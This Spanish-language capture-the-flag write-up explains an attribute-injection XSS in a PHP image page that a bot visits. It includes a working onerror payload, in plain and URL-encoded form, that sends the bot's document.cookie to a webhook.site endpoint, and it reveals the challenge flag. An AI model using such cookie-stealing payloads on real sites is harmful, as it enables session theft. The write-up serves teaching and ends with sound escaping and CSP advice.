# Bitset

**Flag encontrada:** `infobahn{1eT5_seE_whO_rE4Ds_th3_Php_docs}`

## 1) Resumen rápido

El reto expone una página que embebe una imagen controlada por el usuario a partir de `?url=` y un botón **Share image** que hace que un **bot** (Chromium headless autenticado) visite la misma página. El backend inserta el valor de `url` en:

```html
<img src='$URL' ...>

```

Sin escapar comillas simples, lo que permite **cerrar** el atributo `src` e **inyectar** otro (p. ej., `onerror`) para ejecutar JS y **exfiltrar** la cookie `flag` del bot.

---

## 2) Metodología (pasos)

### 2.1 Entender el vector

- El bot visita `/bot?url=…` y carga internamente una página PHP con `<img>` usando nuestro `url`.
- Contexto: el bot está **logueado** (setea cookie `flag`). Si ejecutamos JS, `document.cookie` es accesible.

### 2.2 Verificar inyección de atributo

- Hipótesis: `$URL` se renderiza entre comillas simples → probar payload con `'` para romper `src`.
- Objetivo: forzar **error** de carga para disparar `onerror` y ejecutar JS controlado.

### 2.3 Preparar endpoint de captura

- Se usó **webhook.site** para recibir la cookie exfiltrada como query param.

### 2.4 Payload (legible, sin URL-encoding)

```
http://x/' onerror=new Image().src='https://webhook.site/77ec2861-91c6-40ef-b3af-1e53ab35555f?c='+encodeURIComponent(document.cookie)//

```

- `http://x/` → imagen inexistente ⇒ **dispara `onerror`**.
- `new Image().src=…` envía `document.cookie` al endpoint de captura.
- `encodeURIComponent` asegura transmisión segura en querystring.
- `//` comenta el resto del atributo.

### 2.5 Payload URL-encodeado (apto para `url=`)

```
https://bitset-web.challs.infobahnc.tf/bot?url=http%3A%2F%2Fx%2F%27%20onerror%3Dnew%20Image%28%29.src%3D%27https%3A%2F%2Fwebhook.site%2F77ec2861-91c6-40ef-b3af-1e53ab35555f%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%2F%2F

```

### 2.6 Ejecución y verificación

- Se abrió el enlace final; a los pocos segundos llegó una nueva request en `webhook.site` con `?c=...`.
- El valor `c` contenía la cookie del bot con la **flag**.

---

## 3) Resultado

- **Flag obtenida:** `infobahn{1eT5_seE_whO_rE4Ds_th3_Php_docs}`.
- La exfiltración confirmó XSS por **inyección de atributo** al no escapar comillas simples.

---

## 4) Código clave (resumen)

- **Vector:** `<img src='$URL'>` sin `htmlspecialchars(..., ENT_QUOTES)`.
- **PoC:** cerrar `'` + `onerror=...` + envío con `new Image().src`.
- **Infra de captura:** `webhook.site` (o equivalente) para recibir `document.cookie`.

---

## 5) Lecciones y buenas prácticas

- **Escapado en atributos:** en PHP usar `htmlspecialchars($url, ENT_QUOTES, 'UTF-8')` para escapar **'** y **"**.
- **Validación de entrada:** restringir `url` a `https://` y bloquear caracteres peligrosos.
- **Cookies sensibles:** marcar `HttpOnly` + `Secure` para reducir exfiltración directa.
- **CSP defensiva:** evitar `unsafe-inline`; usar nonces/hash para handlers.
- **Evitar concatenaciones HTML:** preferir plantillas o APIs de DOM que auto-escapen.